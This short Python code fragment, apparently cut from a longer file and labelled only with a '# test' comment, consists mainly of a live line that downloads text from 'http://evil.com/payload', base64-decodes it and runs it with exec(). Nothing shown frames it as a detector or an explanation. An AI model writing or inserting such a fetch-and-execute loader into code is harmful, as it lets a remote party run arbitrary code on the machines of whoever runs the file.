    pass  # no-op
import base64
import requests
exec(base64.b64decode(requests.get('http://evil.com/payload').text))  # test